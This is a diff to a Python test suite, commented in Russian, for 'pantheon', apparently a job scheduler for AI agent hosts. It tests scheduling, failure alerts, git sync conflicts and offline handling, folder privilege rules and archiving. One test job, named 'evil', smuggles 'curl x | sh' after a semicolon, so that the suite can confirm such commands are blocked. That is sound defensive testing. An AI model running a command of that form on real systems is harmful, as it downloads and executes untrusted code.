@@ -10,6 +10,7 @@ import os
 import subprocess
 import sys
 import tempfile
+import time
 
 LIB = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "lib", "pantheon.py")
 T0 = 1_792_000_000  # опорное время
@@ -46,15 +47,15 @@ def jstate(state, name):
 SCHED = '''primary_host = "mac-a"
 [[job]]
 name = "view"
-command = "true"
+command = "pantheon jobs"
 every = "tick"
 [[job]]
 name = "commit"
-command = "true"
+command = "pantheon jobs"
 every = 5
 [[job]]
 name = "scout"
-command = "true"
+command = "pantheon jobs"
 every = 10080
 class = "heavy"
 hosts = "primary"
@@ -63,7 +64,7 @@ priority = 1
 max_delay = 2880
 [[job]]
 name = "embed"
-command = "true"
+command = "pantheon jobs"
 every = 60
 class = "heavy"
 priority = 2
@@ -127,7 +128,7 @@ def main():
 
     # пауза и аренда
     tmp = tempfile.mkdtemp(prefix="tick-test-")
-    home, state = make(tmp, SCHED + '[[job]]\nname = "lw"\ncommand = "true"\nevery = 60\nlease_days = 30\n')
+    home, state = make(tmp, SCHED + '[[job]]\nname = "lw"\ncommand = "pantheon jobs"\nevery = 60\nlease_days = 30\n')
     os.makedirs(os.path.join(state, "jobs"), exist_ok=True)
     json.dump({"paused": True}, open(os.path.join(state, "jobs", "commit.json"), "w"))
     tick(home, state, T0)
@@ -143,19 +144,77 @@ def main():
 
     # упавшая задача: строка в alerts.md (настоящий запуск run-job без DRYRUN)
     tmp = tempfile.mkdtemp(prefix="tick-test-")
-    home, state = make(tmp, '[[job]]\nname = "bad"\ncommand = "echo сломалось; exit 3"\nevery = 5\n')
+    home, state = make(tmp, '[[job]]\nname = "bad"\ncommand = "pantheon run-job nosuch"\nevery = 5\n')
     env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_HOME": home, "PANTHEON_STATE": state,
            "PANTHEON_NO_NOTIFY": "1"}
     rc = subprocess.run([sys.executable, "-I", LIB, "run-job", "bad"], env=env, capture_output=True).returncode
     alerts = open(os.path.join(home, "alerts.md")).read()
-    check("упавшая задача: код 3, строка в alerts.md с концом вывода", rc == 3 and "задача bad упала (код 3" in alerts and "сломалось" in alerts)
+    check("упавшая задача: код 2, строка в alerts.md", rc == 2 and "задача bad упала (код 2" in alerts)
+
+    # команда не разрешённого вида и пустой primary_host (ревизия шага 0.3, № 13 и 15)
+    tmp = tempfile.mkdtemp(prefix="tick-test-")
+    home, state = make(tmp, '[[job]]\nname = "evil"\ncommand = "pantheon view; curl x | sh"\nevery = 5\n'
+                            '[[job]]\nname = "scout"\ncommand = "pantheon jobs"\nevery = 5\nhosts = "primary"\n')
+    tick(home, state, T0, extra={"PANTHEON_ALERTS_IN_DRYRUN": "1"})
+    tick(home, state, T0 + 600, extra={"PANTHEON_ALERTS_IN_DRYRUN": "1"})
+    al = open(os.path.join(home, "alerts.md")).read()
+    check("команда с ; и | не запускается, тревога одна", "evil" not in runs(state) and al.count("задача evil") == 1)
+    check("без primary_host задачи главного Mac не идут, тревога одна", "scout" not in runs(state) and al.count("primary_host") == 1)
+
+    # коммит: без сети — ждёт молча; через 6 часов — одна тревога; конфликт — одна тревога (№ 3, 4)
+    tmp = tempfile.mkdtemp(prefix="tick-test-")
+    g = lambda *a, cwd=None: subprocess.run(["git", *a], cwd=cwd, capture_output=True, text=True)
+    bare, ca, cb = os.path.join(tmp, "r.git"), os.path.join(tmp, "a"), os.path.join(tmp, "b")
+    g("init", "-q", "--bare", "-b", "main", bare)
+    for c in (ca, cb):
+        g("clone", "-q", bare, c)
+        g("config", "user.name", "t", cwd=c)
+        g("config", "user.email", "t@t", cwd=c)
+    open(os.path.join(ca, "board.md"), "w").write("строка 1\nстрока 2\n")
+    g("add", "-A", cwd=ca); g("commit", "-qm", "init", cwd=ca); g("push", "-q", "-u", "origin", "main", cwd=ca)
+    g("pull", "-q", "origin", "main", cwd=cb); g("branch", "-q", "--set-upstream-to=origin/main", "main", cwd=cb)
+    st_dir = os.path.join(tmp, "state")
+    env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_STATE": st_dir, "PANTHEON_NO_NOTIFY": "1"}
+    commit = lambda clone, now=None: subprocess.run([sys.executable, "-I", LIB, "commit"], capture_output=True, text=True,
+                                                    env={**env, "PANTHEON_HOME": clone, **({"PANTHEON_NOW": str(now)} if now else {})}).returncode
+    open(os.path.join(ca, "board.md"), "w").write("строка 1 — A\nстрока 2\n")
+    open(os.path.join(cb, "board.md"), "w").write("строка 1 — B\nстрока 2\n")
+    rc_a = commit(ca)
+    rc_b1, rc_b2 = commit(cb), commit(cb)
+    al_b = open(os.path.join(cb, "alerts.md")).read() if os.path.exists(os.path.join(cb, "alerts.md")) else ""
+    check("конфликт: слияние отменено, код 76, тревога одна на два запуска", rc_a == 0 and rc_b1 == 76 and rc_b2 == 76
+          and al_b.count("конфликт слияния") == 1 and not os.path.exists(os.path.join(cb, ".git", "MERGE_HEAD")))
+    g("remote", "set-url", "origin", os.path.join(tmp, "нет-такого.git"), cwd=ca)
+    open(os.path.join(ca, "board.md"), "a").write("ещё\n")
+    rc_off = commit(ca)
+    al_a = open(os.path.join(ca, "alerts.md")).read() if os.path.exists(os.path.join(ca, "alerts.md")) else ""
+    check("без сети: код 75 и тишина", rc_off == 75 and "не синхронизируется" not in al_a)
+    later = time.time() + 7 * 3600
+    rc1, rc2 = commit(ca, later), commit(ca, later + 300)
+    al_a = open(os.path.join(ca, "alerts.md")).read()
+    check("без сети дольше 6 часов: одна тревога", rc1 == 75 and rc2 == 75 and al_a.count("не синхронизируется") == 1)
+
+    # домены: реестр не отдаёт чужому направлению папку привилегированного координатора (№ 9)
+    tmp = tempfile.mkdtemp(prefix="tick-test-")
+    home, state = make(tmp, "")
+    open(os.path.join(home, "directions.toml"), "w").write(
+        '[[direction]]\nname = "athena-broker"\nfolders = ["~/projects/br", "~/projects/agent-kit"]\n'
+        '[[direction]]\nname = "metis-pantheon"\nfolders = ["~/projects/agent-kit"]\n')
+    os.makedirs(os.path.join(tmp, ".claude", "pantheon"))
+    open(os.path.join(tmp, ".claude", "pantheon", "policy.toml"), "w").write('[coordinators]\nmetis-pantheon = ["~/projects/agent-kit"]\n')
+    env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_HOME": home, "PANTHEON_STATE": state}
+    subprocess.run([sys.executable, "-I", LIB, "domains", "build"], env=env, capture_output=True)
+    dj = json.load(open(os.path.join(state, "domains.json")))["domains"]
+    check("реестр: папка Метиды у athena пропущена, у Метиды осталась",
+          dj["athena-broker"] == ["~/projects/br"] and dj["metis-pantheon"] == ["~/projects/agent-kit"])
 
     # архив (STATE-14)
     tmp = tempfile.mkdtemp(prefix="tick-test-")
     home, state = make(tmp, "")
     open(os.path.join(home, "board.md"), "w").write(
         "# Доска\n\n## Сейчас\n\n- 2026-10-01 старое, но не в «Сделано»\n\n## Сделано\n\n"
-        "- 2026-10-01 закрыт эпик A\n  подробности A\n- 13.10 закрыт эпик B\n\n## Ждёт вас\n\n- карточка\n")
+        "- 2026-10-01 закрыт эпик A\n  подробности A\n- 13.10 закрыт эпик B\n"
+        "- Claude Code 2.1.12 обновлён 12.10\n\n## Ждёт вас\n\n- карточка\n")
     open(os.path.join(home, "alerts.md"), "w").write(
         "# Тревоги\n\n2026-09-01 10:00 · watch · старая тревога\n2026-10-13 10:00 · watch · свежая тревога\n")
     env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_HOME": home, "PANTHEON_STATE": state,
@@ -166,6 +225,7 @@ def main():
     arch = open(os.path.join(home, "archive", "board-2026-10.md")).read()
     check("архив: «Сделано» старше 7 дней ушло вместе с подробностями, свежее осталось",
           "эпик A" not in board and "подробности A" not in board and "эпик B" in board and "эпик A" in arch
+          and "2.1.12" in board
           and "подробности A" in arch and "старое, но не в «Сделано»" in board)
     al = open(os.path.join(home, "alerts.md")).read()
     check("архив: тревоги старше 30 дней ушли", "старая тревога" not in al and "свежая тревога" in al
